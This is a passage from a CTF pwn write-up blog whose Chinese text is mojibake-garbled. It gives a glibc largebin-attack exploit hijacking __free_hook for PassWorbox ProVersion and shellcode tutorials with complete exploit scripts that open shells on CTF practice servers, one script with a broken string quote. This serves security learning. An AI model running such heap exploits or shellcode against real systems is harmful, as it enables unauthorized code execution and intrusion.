<p>æœ€åä¼šæœ‰(target-0x20)-&gt;fd_nextsize = p2<br>
å³target = p2<br>
ç›¸å½“äºå‘targetä¸­å†™å…¥äº†p2çš„åœ°å€</p>
<p>ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹ï¼š<br>
<img src="http://static.zybuluo.com/hgggg/o5gkhadyyt9y9l9kwdtzebi3/image_1fj24revc10d3vqt14gd1e8d101i9.png" alt="image_1fj24revc10d3vqt14gd1e8d101i9.png-15.3kB"></p>
<h2 id="ä¾‹é¢˜2"><a class="header-anchor" href="#ä¾‹é¢˜2">Â¶</a>ä¾‹é¢˜2</h2>
<h3 id="2021-ç¥¥äº‘æ¯-PassWorbox-ProVersion"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-PassWorbox-ProVersion">Â¶</a>[2021 ç¥¥äº‘æ¯]PassWorbox ProVersion</h3>
<h4 id="é¢˜ç›®åˆ†æ-v3"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v3">Â¶</a>é¢˜ç›®åˆ†æ</h4>
<p>è¿™é¢˜ç¬¬ä¸€æ¬¡åšæ—¶æ˜¯ç”¨çš„house of bananaåšå‡ºæ¥çš„ï¼Œåæ¥çœ‹åˆ°å¤§ä½¬å†™çš„wpå‘ç°largebin attackä¹Ÿå¯ä»¥åš</p>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/rfpg2n94hrkhqrdjxq9ao891/image_1fj5dk0g2kod1bbl1osd112er0t9.png" alt="image_1fj5dk0g2kod1bbl1osd112er0t9.png-68.8kB"></p>
<p>é™åˆ¶ç”³è¯·å †å—å¤§å°åªèƒ½ä¸ºlarge chunk å¤§å°ï¼Œä¸”ä¼šè®²contenté€šè¿‡encodeå‡½æ•°åŠ å¯†</p>
<p>endcodeå‡½æ•°å¦‚ä¸‹<br>
<img src="http://static.zybuluo.com/hgggg/gpg6bf6nt9a4gfp5g11tzwjt/image_1fj5dvb0319dtkrp8cn1juo1bjrm.png" alt="image_1fj5dvb0319dtkrp8cn1juo1bjrm.png-29kB"><br>
è®²æ˜æ–‡åˆ†ä¸ºå…«ä½ä¸€ç»„ä¸keyè¿›è¡Œå¼‚æˆ–åŠ å¯†ï¼Œä¸”keyä¸ºrandéšæœºç”Ÿæˆ</p>
<p>åŒæ—¶è¿˜ç»™äº†ä¸€ä¸ªrecover å‡½æ•°<br>
<img src="http://static.zybuluo.com/hgggg/sc5u9itdujsc1sbb7ht6sga3/image_1fjht6assapj1j73req20ajk49.png" alt="image_1fjht6assapj1j73req20ajk49.png-25.3kB"><br>
è¿™ä¸ªå‡½æ•°å¯ä»¥å›å¤è¢«é‡Šæ”¾æ‰çš„å †å—çš„æ ‡å¿—ä½ï¼Œå¯ä»¥ç”¨æ¥UAF</p>
<p>delete,edit,showéƒ½æ˜¯æ­£å¸¸çš„åŠŸèƒ½</p>
<h4 id="è§£é¢˜æ­¥éª¤-v2"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v2">Â¶</a>è§£é¢˜æ­¥éª¤</h4>
<p>Step1:è·å–key<br>
åˆ©ç”¨fgetsçš„ç‰¹æ€§ï¼Œå½“è¾“å…¥\næ—¶ï¼Œfgetsä¼šç”¨\x00æ¥å¡«å……å‰©ä¸‹çš„sizeï¼Œ0 ^ key = keyæ¥å¾—åˆ°key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>Step2:leak libc<br>
å°†chunk0é‡Šæ”¾åˆ°unsorted binä¸­ï¼Œåˆ©ç”¨UAFå¾—åˆ°libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br></pre></td></tr></table></figure>
<p>Step3:largebin attack<br>
æˆ‘ä»¬å·²çŸ¥å¯ä»¥åˆ©ç”¨largebin attack åœ¨ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªå †åœ°å€ï¼Œé‚£ä¹ˆå¾€å“ªé‡Œå†™å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œå¯ä»¥æ”»å‡»mp_ç»“æ„ä½“<br>
mp_ç»“æ„ä½“å¦‚ä¸‹<br>
<img src="http://static.zybuluo.com/hgggg/bm1c6bg7fga4cixex30gwjue/1.png" alt="1.png-27.5kB"></p>
<p>mp_.tcache_binså…¶å®å°±æ—¶åªå…è®¸çš„æœ€å¤§tcache chunkå¤§å°ï¼Œå¦‚æœé‡Šæ”¾çš„chunkå°äºmp_.tcache_binsé‚£ä¹ˆå°±ä¼šè¢«å½“ä½œtcache binæ¥å¤„ç†</p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥å°†ä¸€ä¸ªchunkçš„åœ°å€å†™å…¥åˆ°tcahe_binsçš„ä½ç½®ï¼Œæ¥ä¼ªé€ å…¶å€¼ï¼Œç”±äºchunkçš„åœ°å€ä½œä¸ºå€¼å¤§å°éƒ½éå¸¸å¤§ï¼Œæˆ‘ä»¬çš„large chunkä¹Ÿä¼šè¢«å½“ä½œtcache chunkæ¥å¤„ç†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨tcache double freeåŠ«æŒ__free_hookæ¥getshelläº†</p>
<p>ç”±äºmp_ç»“æ„ä½“çš„åç§»æ— æ³•åˆ©ç”¨libc.symbolè®¡ç®—ï¼Œè¿™é‡Œç»™å‡ºè®¡ç®—æ–¹æ³•<br>
<img src="http://static.zybuluo.com/hgggg/ee3egiy828wap8m9po5fyt3f/2.png" alt="2.png-47.4kB"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±èƒ½å¾—åˆ°mp_+72çš„åœ°å€ï¼Œå†åˆ©ç”¨distanceè®¡ç®—åç§»ï¼Œtcache_binsåœ¨mp_+80çš„ä½ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#chunk0 -&gt; largebin</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_base + <span class="number">0x1eb280</span> + <span class="number">0x50</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
<p>Step4: åŠ«æŒfree_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(system))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp"><a class="header-anchor" href="#å®Œæ•´exp">Â¶</a>å®Œæ•´exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28114)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak key</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#chunk0 -&gt; largebin</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_base + <span class="number">0x1eb280</span> + <span class="number">0x50</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(system))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a class="header-anchor" href="#å‚è€ƒ">Â¶</a>å‚è€ƒ</h2>
<p><a href="https://blog.csdn.net/zero_lee/article/details/7865481">https://blog.csdn.net/zero_lee/article/details/7865481</a><br>
<a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=24">https://www.bilibili.com/video/BV1Uv411j7fr?p=24</a><br>
<a href="https://www.freebuf.com/articles/system/209096.html">https://www.freebuf.com/articles/system/209096.html</a><br>
<a href="http://blog.eonew.cn/archives/858#glibc-223mallocmallocc_3532">http://blog.eonew.cn/archives/858#glibc-223mallocmallocc_3532</a><br>
<a href="https://blog.csdn.net/qq_41202237/article/details/112825556">https://blog.csdn.net/qq_41202237/article/details/112825556</a><br>
<a href="https://www.anquanke.com/post/id/244018">https://www.anquanke.com/post/id/244018</a><br>
<a href="https://www.jianshu.com/p/d2588586a47d">https://www.jianshu.com/p/d2588586a47d</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/10/04/shellcode/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/31.jpg" alt="pic"></p>
<span id="more"></span>
<h3 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h3>
<pre><code>åœ¨pwnä¸­shellcodeåˆ©ç”¨æ–¹å¼ä¸€èˆ¬ä¸ºè§¦å‘ä¸­æ–­ï¼ˆint 0x80 æˆ– syscallï¼‰æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨
system(&quot;/bin/sh&quot;)ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨execve(&quot;/bin/sh&quot;,0,0)
</code></pre>
<h3 id="ç¤ºä¾‹ç¨‹åº"><a class="header-anchor" href="#ç¤ºä¾‹ç¨‹åº">Â¶</a>ç¤ºä¾‹ç¨‹åº</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="syscall-è°ƒç”¨è¡¨"><a class="header-anchor" href="#syscall-è°ƒç”¨è¡¨">Â¶</a>syscall è°ƒç”¨è¡¨</h3>
<pre><code>https://publicki.top/syscall.html
</code></pre>
<h3 id="ä½¿ç”¨pwntoolsç”Ÿæˆshellcode"><a class="header-anchor" href="#ä½¿ç”¨pwntoolsç”Ÿæˆshellcode">Â¶</a>ä½¿ç”¨pwntoolsç”Ÿæˆshellcode</h3>
<p>32ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>64ä½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>mips</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
<p>arm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
<p><strong>å‘</strong></p>
<pre><code>åœ¨è¿è¡Œç”Ÿæˆmipså’Œarmæ¶æ„çš„shellcodeæ—¶ä¼šæœ‰ä¸€ç³»åˆ—çš„æŠ¥é”™
è¿™é‡Œç»™å‡ºè§£å†³æ–¹æ¡ˆ
git clone https://github.com/Gallopsled/pwntools-binutils
cd pwntools-binutils/ubuntu
chmod +x install_all.sh
./install_all.sh arm
</code></pre>
<h3 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h3>
<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">Â¶</a>mrctf2020_shellcode</h4>
<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
<p>ä»idaä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºçš„åŠŸèƒ½ä¸ºè¯»å…¥0x400å­—èŠ‚ï¼Œç„¶åæ‰§è¡Œè¯»å…¥çš„å†…å®¹<br>
<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
<p>åŒæ—¶æ ˆä¸Šæœ‰å¯æ‰§è¡Œæƒé™</p>
<p>é‚£æ¥ä¸‹æ¥ç¼–å†™exp</p>
<h5 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯åœ¨CTFæ¯”èµ›ä¸­å¾€å¾€ä¼šå¯¹è¾“å…¥é•¿åº¦è¿›è¡Œé™åˆ¶æ‰€ä»¥æœ‰æ—¶ä¹Ÿéœ€è¦è‡ªå·±ç¼–å†™shellcode</p>
<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">Â¶</a>mrctf2020_shellcode_revenge</h4>
<p>æœ¬é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä¸è¿‡å´åªèƒ½ç”¨å¯è§å­—ç¬¦æ„é€ shellcode,è¿™é‡Œä½¿ç”¨alpha3æ¥ç”Ÿæˆ<br>
<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">Â¶</a>ciscn_s_6</h4>
<p>IDAåˆ†æ<br>
<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
æ€è·¯</p>
<pre><code>pwnå‡½æ•°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å…¥shellcodeå¹¶å°†è¿”å›åœ°å€è¦†ç›–ä¸ºjmp espä¹‹åå»è°ƒç”¨ä¹‹å‰çš„shellcode
ç”±äºè¾“å…¥é•¿åº¦é™åˆ¶ï¼Œæœ¬é¢˜éœ€æ‰‹å†™shellcode
</code></pre>
<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">Â¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="pwnable-orw"><a class="header-anchor" href="#pwnable-orw">Â¶</a>pwnable_orw</h4>
<p>é¢˜ç›®åˆ†æ<br>
<img src="http://static.zybuluo.com/hgggg/mkqj8y9s162gf0du6t1o7cev/6.png" alt="6.png-42.5kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/x6ddonudswawwmj20vq2fnl1/7.png" alt="7.png-40.7kB"></p>
<p>æŸ¥çœ‹æ²™ç›’<br>
